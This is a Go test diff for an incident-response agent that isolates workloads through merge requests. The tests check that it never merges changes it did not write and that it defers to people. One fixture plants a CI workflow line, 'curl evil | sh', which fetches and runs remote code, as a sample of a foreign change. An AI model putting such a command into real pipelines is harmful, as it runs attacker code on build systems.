@@ -68,6 +68,13 @@ type gitHost struct {
 	// the head. A test uses it to push a commit in the gap.
 	beforeMerge func(ref string)
 
+	// foreign are files that a person committed on the branch before the open.
+	// tamper changes the content of the first file of the change on the
+	// branch. noFiles makes merge_request_state return no changed_files.
+	foreign []map[string]any
+	tamper  bool
+	noFiles bool
+
 	opened []map[string]any
 	prs    map[string]*mr
 	base   map[string]string // path -> content on the base branch
@@ -125,6 +132,10 @@ func (g *gitHost) CallToolProto(
 		for _, f := range files {
 			m.files = append(m.files, f.(map[string]any)) //nolint:forcetypeassert // the mock controls the args
 		}
+		if g.tamper {
+			m.files[0] = map[string]any{"path": m.files[0]["path"], "content": "kind: Nothing\n"}
+		}
+		m.files = append(m.files, g.foreign...)
 		g.prs[ref] = m
 		result = map[string]any{"merge_request": ref, "head_sha": g.prs[ref].sha}
 	case isolate.ToolMerge:
@@ -135,6 +146,13 @@ func (g *gitHost) CallToolProto(
 			return errors.New("connector mcp: merge_request_state reported an error: not found")
 		}
 		result = map[string]any{"state": m.state, "source_branch": m.branch, "head_sha": m.sha, "pipeline_green": g.green}
+		if !g.noFiles {
+			files := make([]any, 0, len(m.files))
+			for _, f := range m.files {
+				files = append(files, f)
+			}
+			result["changed_files"] = files
+		}
 	case isolate.ToolClose:
 		if !g.tools {
 			return errors.New("tool not found: " + id)
@@ -880,5 +898,111 @@ func TestRelease_LostReleasedRecordIsARelease(t *testing.T) {
 	}
 	if g.count(isolate.ToolMerge) != merges {
 		t.Fatalf("the agent merged the release a second time")
+	}
+}
+
+// M1 (b). The branch name is easy to guess. A person makes the branch first,
+// and the commit of the agent lands on top of theirs. The head commit names
+// that history too, so the agent compares the files that the merge request
+// changes with the expected change, and it merges only an exact match.
+func TestIsolate_MergeRequestWithAForeignChangeIsNeverMerged(t *testing.T) {
+	cases := map[string]func(g *gitHost){
+		"a foreign file": func(g *gitHost) {
+			g.foreign = []map[string]any{{"path": ".github/workflows/x.yaml", "content": "run: curl evil | sh\n"}}
+		},
+		"the policy changed": func(g *gitHost) { g.tamper = true },
+		"no file list":       func(g *gitHost) { g.noFiles = true },
+	}
+	for name, set := range cases {
+		t.Run(name, func(t *testing.T) {
+			g, st, p := setup(t)
+			set(g)
+			w := workload(t)
+			sum, err := p.Isolate(context.Background(), incidentKey, w)
+			if err != nil {
+				t.Fatalf("Isolate: %v", err)
+			}
+			if sum.Merged || g.count(isolate.ToolMerge) != 0 || g.prs["acme/manifests#1"].state != "open" {
+				t.Fatalf("the agent merged a change that it did not write: %v", sum.Lines)
+			}
+			if !strings.Contains(joined(sum), "not trusted") {
+				t.Errorf("the report does not say why: %v", sum.Lines)
+			}
+			if len(g.base) != 0 || st.records["ir_isolation_merged_"+repo.Key(incidentKey, w)+"_1"] != "" {
+				t.Errorf("base = %v, records = %v", g.base, st.records)
+			}
+		})
+	}
+}
+
+func TestRelease_ReleaseMergeRequestWithAForeignChangeIsNeverMerged(t *testing.T) {
+	g, st, p := setup(t)
+	w := workload(t)
+	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
+		t.Fatalf("Isolate: %v", err)
+	}
+	verify(st)
+	g.foreign = []map[string]any{{"path": "contain/other.yaml", "content": "x: 1\n"}}
+	merges := g.count(isolate.ToolMerge)
+	sum, err := p.Release(context.Background(), incidentKey, w)
+	if err != nil || sum.Released || g.count(isolate.ToolMerge) != merges {
+		t.Fatalf("released = %v, err = %v: %v", sum.Released, err, sum.Lines)
+	}
+}
+
+// M2. A ClusterNetworkPolicy cannot name a node, so it does not deny ingress
+// from nodes, from pods with hostNetwork, or from traffic that is translated
+// to a node address. The report and the record say so. A Cilium policy
+// denies all entities and has no such note.
+func TestIsolate_ClusterKindStatesTheBypass(t *testing.T) {
+	for kind, want := range map[string]bool{
+		isolate.KindCluster: true, isolate.KindNetworkPolicy: true, isolate.KindCilium: false,
+	} {
+		t.Run(kind, func(t *testing.T) {
+			_, st, p := setupWith(t, repoOf(kind))
+			w := workload(t)
+			sum, err := p.Isolate(context.Background(), incidentKey, w)
+			if err != nil || !sum.Merged {
+				t.Fatalf("Isolate: %v, %v", err, sum.Lines)
+			}
+			rec := st.records["ir_isolation_bypass_"+repoOf(kind).Key(incidentKey, w)+"_1"]
+			if (rec != "") != want || strings.Contains(joined(sum), "caution") != want {
+				t.Fatalf("record = %q, lines = %v, want a note: %v", rec, sum.Lines, want)
+			}
+			if kind == isolate.KindCluster {
+				for _, w := range []string{"nodes", "hostNetwork", "translated to a node address"} {
+					if !strings.Contains(rec, w) {
+						t.Errorf("the note lacks %q: %s", w, rec)
+					}
+				}
+			}
+		})
+	}
+}
+
+// When a person closes the release merge request without a merge, the release
+// stops and says that a person must decide. It does not open a third merge
+// request, and it does not merge.
+func TestRelease_PersonClosesTheReleaseMergeRequest(t *testing.T) {
+	g, st, p := setup(t)
+	w := workload(t)
+	if _, err := p.Isolate(context.Background(), incidentKey, w); err != nil {
+		t.Fatalf("Isolate: %v", err)
+	}
+	verify(st)
+	g.green = false
+	if _, err := p.Release(context.Background(), incidentKey, w); err != nil {
+		t.Fatalf("first release: %v", err)
+	}
+	g.prs["acme/manifests#2"].state = "closed"
+	g.green = true
+	opened, merges := len(g.opened), g.count(isolate.ToolMerge)
+	sum, err := p.Release(context.Background(), incidentKey, w)
+	if err != nil || sum.Released {
+		t.Fatalf("released = %v, err = %v", sum.Released, err)
+	}
+	stopped := strings.Contains(joined(sum), "a person must decide")
+	if !stopped || len(g.opened) != opened || g.count(isolate.ToolMerge) != merges {
+		t.Fatalf("opened = %d, merges = %d: %v", len(g.opened), g.count(isolate.ToolMerge), sum.Lines)
 	}
 }
